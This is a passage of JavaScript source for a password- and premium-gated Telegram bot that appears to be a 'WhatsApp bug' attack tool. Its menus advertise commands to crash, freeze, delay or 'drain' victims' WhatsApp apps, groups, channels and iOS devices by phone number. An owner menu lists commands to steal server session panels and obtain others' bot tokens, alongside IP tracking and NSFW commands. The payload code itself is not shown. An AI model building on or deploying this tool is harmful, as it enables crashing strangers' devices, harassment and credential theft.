•Bug Ch
•Bug Comu
•Md Menu
•Nsfw Menu
•Secret Bug Menu
•MultiBug Number
•Fun Menu
•Tools Menu
•All Function New
﻿
<blockquote><strong>•Total Tools? 50+</strong></blockquote>

<blockquote><strong>‣ Efek Bug V38?</strong></blockquote>
 Pv @Raffioffci2
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "back" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bug_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    
    : ctx.from.first_name || "User";
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͜𝐭͡𝐚͢𝐜͜𝐤͡ ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /hoymoly ━ Crash Click Loca ⚜️
└‣ Crash Location Click 
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /viperlayinvis ━ Delay Invis🎭
└‣ Invisible Delay 
⫹⫺ - /xdelay ━ Delay Visible 🩸
└‣ Delay Visible Hard
⫹⫺ - /xspam ━ Invisible Delay Free Spam 🚀
└‣ Free Spam Delay Invisible
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /blank1msg ━ Blank 1 Msg 〽️
└‣ Blank Type 1 Massage 
⫹⫺ - /blankclick ━ Blank Click 🦠
└‣ Blank Type Click
⫹⫺ - /blankhard ━ Blank Hard 🖥️
└‣ Blank Type Hard
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bug_menu2", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͜𝐭͡𝐚͢𝐜͜𝐤 ͡𝐕2 ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /xsticker ━ Delay Sticker 🕷️
└‣ Delay Sticker New
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /blankloca ━ Blank Loca ⚡
└‣ Blank Location New
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /bulldozer ━ Drain Wha'tsApp 🔥
└‣ Bulldozer All What'sApp
⫹⫺ - /protocol11 ━ Protocol 11 🍭
└‣ Bulldozer Type Protocol
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("ui_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐔͢𝐢͡ ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /overloadsystem ━ Crash Ui System 🥶
└‣ Bug Type Ui Freeze X Overload
⫹⫺ - /uiloca ━ Loca Ui System 🦠
└‣ Bug Type Ui Freeze X Location
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐔͢𝐢͡ ⍣᳟ 𝐋͜𝐞͢𝐯͜𝐞͢𝐥</strong></blockquote>
⫹⫺ - /uieasy ━ Ui Level Easy 💣
└‣ Ui With Difficult Easy
⫹⫺ - /uimedium ━ Ui Level Medium 🐉
└‣ Ui With Difficult Medium
⫹⫺ - /uihard ━ Ui Level Hard 💀
└‣ Ui With Difficult Hard
⫹⫺ - /uihardsuper ━ Ui Level Super Hard ☢️
└‣ Ui With Difficult Super Hard
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("jmbud_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐒͢𝐩͜𝐞͡𝐜͢𝐢͜𝐚͡𝐥 𝐁͢𝐮͡𝐠</strong></blockquote>
⫹⫺ - /attack ━ Select The Button Bug 🔮
└‣ Button Bug
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /multibug ━ Multi Bug Core ⚡
└‣ Bug With 2 Number Or More
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /xslomotion ━ Free Loop Bug 🩸
└‣ Bug Delay Free Loop And Sleep
⟣━━━━━━━━━━━━━━━━━━
#Note:
𝙏𝙮𝙥𝙚 𝘽𝙪𝙜 𝘿𝙞𝙖𝙩𝙖𝙨 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙗𝙪𝙩𝙩𝙤𝙣 𝙘𝙤𝙣𝙩𝙤𝙝 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 :
/attack 62xx 𝙢𝙖𝙠𝙖 𝙖𝙠𝙖𝙣 𝙢𝙚𝙢𝙪𝙣𝙘𝙪𝙡𝙠𝙖𝙣 𝙗𝙚𝙗𝙚𝙧𝙖𝙥𝙖 𝙢𝙚𝙣𝙪 𝙗𝙪𝙩𝙩𝙤𝙣 𝙗𝙪𝙜, 𝙨𝙚𝙡𝙖𝙢𝙖𝙩 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bukceha_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͡𝐭͜𝐚͢𝐜͜𝐤 𝐂͢𝐡  ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /newsletterfc ━ Force Close Ch 👁️‍🗨️
└‣ Newsletter Force No Click
⟣━━━━━━━━━━━━━━━━━━
#Note:
𝙉𝙤𝙢𝙤𝙧 𝙖𝙩𝙖𝙪 𝙨𝙚𝙣𝙙𝙚𝙧 𝙠𝙖𝙢𝙪, 𝙝𝙖𝙧𝙪𝙨 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙖𝙙𝙢𝙞𝙣 𝙙𝙞 𝙘𝙝𝙖𝙣𝙣𝙚𝙡 𝙩𝙖𝙧𝙜𝙚𝙩 𝙖𝙜𝙖𝙧 𝙗𝙞𝙨𝙖 𝙗𝙪𝙜 𝙙𝙚𝙣𝙜𝙖𝙣 𝙡𝙖𝙣𝙘𝙖𝙧 𝙙𝙖𝙣 𝙩𝙖𝙣𝙥𝙖 𝙠𝙚𝙣𝙙𝙖𝙡𝙖 
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("plerr_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐒͢𝐞͡𝐜͜𝐫͢𝐞͜𝐭. ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /unknown1 ━ Secret Bug V1❓
└‣ Undefined Bug ??
⫹⫺ - /unknown2 ━ Secret Bug V2 ⁉️
└‣ Undefined Bug ??
⫹⫺ - /unknown3 ━ Secret Bug V3 ❔
└‣ Undefined Bug ??
⟣━━━━━━━━━━━━━━━━━━
#Note:
𝘿𝙞 𝙘𝙤𝙢𝙢𝙖𝙙 𝙗𝙪𝙜 𝙞𝙣𝙞, 𝙞𝙣𝙞 𝙖𝙙𝙖𝙡𝙖𝙝 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙗𝙪𝙜 𝙧𝙖𝙝𝙖𝙨𝙞𝙖 𝙮𝙖𝙣𝙜 𝙝𝙖𝙧𝙪𝙨 𝙠𝙞𝙩𝙖 𝙘𝙤𝙗𝙖, 𝙨𝙪𝙥𝙖𝙮𝙖 𝙠𝙞𝙩𝙖 𝙗𝙞𝙨𝙖 𝙩𝙖𝙪 𝙗𝙪𝙜 𝙖𝙥𝙖 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙠𝙞𝙧𝙞𝙢
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("thanks_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐓͢𝐡͡𝐚͜𝐧͢𝐤͡𝐬  ⍣᳟ 𝐓͜𝐨͢</strong></blockquote>
⫹⫺ - @Raffioffci2 ━ My Friend's
⫹⫺ - @thekenzyvxii ━ My Friend's 
⫹⫺ - @NURSAMANLOWW ━ My Support 
⫹⫺ - @dittajayaw ━ My Support 
⫹⫺ - @NuxzOfficialreal ━ My Support 
⫹⫺ - @MAS_SANZZ ━ My Support 
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "back" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("other_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }   

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong> 𝐢͢𝐎͜𝐬͡ ⍣᳟𝐌͢𝐞͡𝐧͜𝐮 </strong></blockquote>
⫹⫺ - /xipongforce ━ Force iOs 🍏
└‣ Bug iOs Force
⫹⫺ - /xipongdelay ━ Delay iOs 🍎
└‣ Bug iOs Delay
⫹⫺ - /xipongui ━ Ui iOs 🖥️
└‣ Bug iOs Ui
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("grup_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͡𝐭͜𝐚͢𝐜͡𝐤 ͜⍣᳟ 𝐆͢𝐛͡ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /crashclickgroup ━ Force Click Grup ☣️
└‣ Bug Group Crash Click Type Loca
⫹⫺ - /blankclickgroup ━ Blank Click Grup 💣
└‣ Bug Group Blank Click All Member
⫹⫺ - /uigroup ━ Overload Grup 🦠
└‣ Bug Group Crash Ui
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("donlot_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐃͢𝐨͡𝐰͜𝐧͢𝐥͜𝐨͢𝐚͡𝐝 ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /tiktokdl ━ Tiktok Download 🎭
⫹⫺ - /ig ━ Instagram Downloader 📥
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("deploi_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐃͢𝐞͡𝐩͜𝐥͢𝐨͡𝐲 ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /deploy [token] ━ Deploy New Bot 🚀
⫹⫺ - /listdeploy ━ View Active Bots 📑
⫹⫺ - /deldeploy [token] ━ Remove One Bot ❌
⫹⫺ - /stopall ━ Stop All Bots ♻️
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("fun_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐅͢𝐮͡𝐧͜͡ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /bucin ━ Quest Bucin 🥴
⫹⫺ - /sadboy ━ Quest Sad 😌
⫹⫺ - /gaymeter ━ Tes Gay Meter 💀
⫹⫺ - /ghost ━ The Ghost Is Here 👻
⫹⫺ - /hack ━ User Hacking 🖥️
⫹⫺ - /bomtag ━ Bom Fun 💣
⫹⫺ - /tebakangka ━ Tebak Angka 🎯
⫹⫺ - /toxic ━ Level Toxic ☣️
⫹⫺ - /tinju ━ Tinju User 🥊
⫹⫺ - /sultan ━ Aura Sultan 👑
⫹⫺ - /duel ━ Challenge a User ⚔️
⫹⫺ - /iq ━ Cek IQ 🧠
⫹⫺ - /waifu ━ Cek Waifu 😋
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("tools_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐓͢𝐨͡𝐨͜͡𝐥͢𝐬͡ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /gpt ━ Chat With Ai Gpt 🤖
⫹⫺ - /countryinfo ━ Information The Country 🇳🇱
⫹⫺ - /tourl ━ From Image/Video To Url 🤧
⫹⫺ - /ssiphone ━ Ss Whatsapp Iphone 📱
⫹⫺ - /brat ━ Create Sticker Brat 🔮
⫹⫺ - /getcode ━ Get HTML Code ⚜️
⫹⫺ - /cekwa ━ Cek Status Wa 👁️‍🗨️
⫹⫺ - /cektele ━ Cek Status Telegram 👁️
⫹⫺ - /tofunc ━ All Media To Func 📝
⫹⫺ - /getfuncblank ━ Get Function Blank 😎
⫹⫺ - /getfuncdelay ━ Get Function Delay 🤓
⫹⫺ - /getfuncfc ━ Get Function Force Close 🦠
⫹⫺ - /web2apk ━ Web To Apps 📡
⫹⫺ - /trackip ━ Tracking Ip ☠️
⫹⫺ - /maps ━ Maps & Location 🗺️
⫹⫺ - /speed ━ Bot Response Speed ⚡
⫹⫺ - /cuaca ━ City Weather Information 🌦️
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("md_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐆͢𝐫͡𝐨͜𝐮͢𝐩 ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /promote (reply) ━ Promote To Admin ⬆️
⫹⫺ - /demote (reply) ━ Demote Admin ⬇️
⫹⫺ - /kick (reply) ━ Remove Member 👢
⫹⫺ - /mute (reply) ━ Silence Member 🔇
⫹⫺ - /unmute (reply) ━ Unsilence Member 🔊
⫹⫺ - /pin (reply) ━ Pin Selected Message 📌
⫹⫺ - /del (reply) ━ Delete Replied Message 🗑️
⫹⫺ - /lock ━ Lock Group (Close Gb Chat) 🔒
⫹⫺ - /unlock ━ Unlock Group (Open Gb Chat) 🔓
⫹⫺ - /info ━ Account Information 🆔
⫹⫺ - /antilink on/off ━ Group Anti-Link 🚫
⫹⫺ - /setrules ━ Set Group Rules 📜
⫹⫺ - /rules ━ View Group Rules 📖
⫹⫺ - /tagadmin ━ Tag All Group Admins 👑
⫹⫺ - /groupinfo ━ Group Information ℹ️
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("nsfw_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐍͢𝐬͡𝐟͜𝐰͢ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /xnxx ━ Video XnXx 🔞
⫹⫺ - /hentai ━ Hentai Nsfw 💀
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("owner_menu", checkOwner, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>🗿 𝐀͢𝐝͡𝐦͜𝐢͢𝐧 𝐀͡𝐜͜𝐜͢𝐞͡𝐬͜𝐬 🗿</strong></blockquote>
⫹⫺ - /addprem ━ Addpremium ⚡
⫹⫺ - /delprem ━ Delpremium 😤
⫹⫺ - /cekprem ━ Cek Premium 🥶
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>🎩 𝐎͢𝐰͡𝐧͜𝐞͢𝐫 𝐀͡𝐜͜𝐜͢𝐞͡𝐬͜𝐬 🎩</strong></blockquote>
⫹⫺ - /rasukbot ━ Get An Expert Bot Token 👁️‍🗨️
⫹⫺ - /csessions ━ Steal Session Panel Srv 😋
⫹⫺ - /addadmin ━ Add Admin Access 🎩
⫹⫺ - /deladmin ━ Del Admin Access 🔥
⫹⫺ - /status ━ Status Bot 🥶
⫹⫺ - /addsender ━ Add Bot 🤭
⟣━━━━━━━━━━━━━━━━━━
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("back", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
